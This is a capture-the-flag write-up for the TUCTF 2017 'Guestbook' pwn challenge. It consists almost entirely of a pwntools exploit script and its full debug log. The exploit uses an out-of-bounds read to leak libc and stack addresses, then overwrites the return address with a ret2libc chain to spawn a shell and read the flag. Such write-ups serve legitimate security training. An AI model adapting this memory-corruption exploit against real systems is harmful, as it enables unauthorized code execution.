---
title: "TUCTF 2017 - Guestbook (Pwn)"
header:
  overlay_image: /assets/images/tuctf2017/guestbook/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Life is Strange Stills by Me"
tags:
  - tuctf2017
  - writeup
  - pwn
---

Pwnable.

## Challenge Description

#### Points

250

#### Description

```
Check it out, I've made a guestbook program. It's nothing special. There's
certainly no secrets here so don't go poking around.

nc guestbook.tuctf.com 4545
```

## Solution

```python
from pwn import *

context.log_level = "debug"

offset_system = 0x0003e3e0
offset_dup2 = 0x000dc620
offset_read = 0x000dbce0
offset_write = 0x000dbd60
offset_str_bin_sh = 0x15f551
offset_puts = 0x00064da0
offset_exit = 0x000311b0
offset_read = 0x000dbce0

timeout = 0.5

def main():
    #p = process("./guestbook")
    p = remote("guestbook.tuctf.com", 4545)

    # Setup
    p.sendline("A")
    p.sendline("B")
    p.sendline("C")
    p.sendline("D")

    # Get address of system
    p.sendline("1")
    p.clean(timeout)
    p.sendline("6")
    p.recv(4*5)
    leak = p.recv(4)
    leak = u32(leak)
    system = leak
    stackleak = p.recv(4)
    stackleak = u32(stackleak)
    returnaddr = stackleak + 48
    libc_base = system - offset_system
    binsh_str = libc_base + offset_str_bin_sh
    log.info("System: 0x%x" % leak)
    log.info("libc base: 0x%x" % libc_base)
    log.info("/bin/sh: 0x%x" % binsh_str)
    log.info("Stack: 0x%x" % stackleak)
    log.info("Return Address at: 0x%x" % returnaddr)
    p.clean(timeout)

    # Overwrite Return Address
    p.sendline("2")
    p.sendline("6")
    p.sendline(p32(returnaddr))
    p.sendline()
    p.clean(timeout)
    p.sendline("2")
    p.sendline("0")
    payload = p32(system)
    payload += p32(0xdeadbeef)
    payload += p32(binsh_str)
    p.sendline(payload)
    p.sendline()
    p.clean(timeout)

    # Trigger the crash
    p.sendline("3")

    p.interactive()

if __name__ == '__main__':
    main()
```

```
ubuntu@ubuntu-xenial:/vagrant/tuctf/guestbook$ python exploit.py
[+] Opening connection to guestbook.tuctf.com on port 4545: Done
[DEBUG] Sent 0x2 bytes:
    'A\n'
[DEBUG] Sent 0x2 bytes:
    'B\n'
[DEBUG] Sent 0x2 bytes:
    'C\n'
[DEBUG] Sent 0x2 bytes:
    'D\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1d bytes:
    'Please setup your guest book:'
[DEBUG] Received 0x2d bytes:
    '\n'
    'Name for guest: #0\n'
    '>>>Name for guest: #1\n'
    '>>>'
[DEBUG] Received 0x92 bytes:
    'Name for guest: #2\n'
    '>>>Name for guest: #3\n'
    '>>>---------------------------\n'
    '1: View name\n'
    '2: Change name\n'
    '3. Quit\n'
    '>>Which entry do you want to view?\n'
    '>>>'
[DEBUG] Sent 0x2 bytes:
    '6\n'
[DEBUG] Received 0x20 bytes:
    00000000  08 10 bf 56  20 10 bf 56  38 10 bf 56  50 10 bf 56  │···V│ ··V│8··V│P··V│
    00000010  f1 b9 5b 0a  e0 83 5d f7  4c c6 93 ff  50 10 bf 56  │··[·│··]·│L···│P··V│
    00000020
[*] System: 0xf75d83e0
[*] libc base: 0xf759a000
[*] /bin/sh: 0xf76f9551
[*] Stack: 0xff93c64c
[*] Return Address at: 0xff93c67c
[DEBUG] Received 0x43 bytes:
    '\n'
    '---------------------------\n'
    '1: View name\n'
    '2: Change name\n'
    '3. Quit\n'
    '>>'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '6\n'
[DEBUG] Sent 0x5 bytes:
    00000000  7c c6 93 ff  0a                                     │|···│·│
    00000005
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[DEBUG] Received 0x26 bytes:
    'Which entry do you want to change?\n'
    '>>>'
[DEBUG] Received 0x24 bytes:
    'Enter the name of the new guest.\n'
    '>>>'
[DEBUG] Received 0x42 bytes:
    '---------------------------\n'
    '1: View name\n'
    '2: Change name\n'
    '3. Quit\n'
    '>>'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Sent 0xd bytes:
    00000000  e0 83 5d f7  ef be ad de  51 95 6f f7  0a           │··]·│····│Q·o·│·│
    0000000d
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[DEBUG] Received 0x26 bytes:
    'Which entry do you want to change?\n'
    '>>>'
[DEBUG] Received 0x24 bytes:
    'Enter the name of the new guest.\n'
    '>>>'
[DEBUG] Received 0x42 bytes:
    '---------------------------\n'
    '1: View name\n'
    '2: Change name\n'
    '3. Quit\n'
    '>>'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[*] Switching to interactive mode
$ ls -la
[DEBUG] Sent 0x7 bytes:
    'ls -la\n'
[DEBUG] Received 0x229 bytes:
    'total 48\n'
    'drwxr-x--- 3 root chal 4096 Nov 25 07:24 .\n'
    'drwxr-xr-x 4 root root 4096 Nov 20 17:56 ..\n'
    '-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_login\n'
    '-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_logout\n'
    '-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_profile\n'
    '-rw-r--r-- 1 root chal   31 Nov 20 18:13 .bashrc\n'
    '-rw-r--r-- 1 root chal   22 Nov 25 07:23 flag.txt\n'
    '-rwxr-xr-x 1 root chal 7784 Nov 25 07:23 guestbook\n'
    '-rw-r--r-- 1 root chal   10 Nov 20 18:12 .profile\n'
    '-rwxr-xr-x 1 root root   75 Nov 25 07:24 start.sh\n'
    'drwxr-xr-x 3 root chal 4096 Nov 20 18:13 usr\n'
total 48
drwxr-x--- 3 root chal 4096 Nov 25 07:24 .
drwxr-xr-x 4 root root 4096 Nov 20 17:56 ..
-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_login
-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_logout
-rw-r--r-- 1 root chal   10 Nov 20 18:12 .bash_profile
-rw-r--r-- 1 root chal   31 Nov 20 18:13 .bashrc
-rw-r--r-- 1 root chal   22 Nov 25 07:23 flag.txt
-rwxr-xr-x 1 root chal 7784 Nov 25 07:23 guestbook
-rw-r--r-- 1 root chal   10 Nov 20 18:12 .profile
-rwxr-xr-x 1 root root   75 Nov 25 07:24 start.sh
drwxr-xr-x 3 root chal 4096 Nov 20 18:13 usr
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x16 bytes:
    'TUCTF{k33p_17_up_k1d}\n'
TUCTF{k33p_17_up_k1d}
$
```

**Flag: TUCTF{k33p\_17\_up\_k1d}**
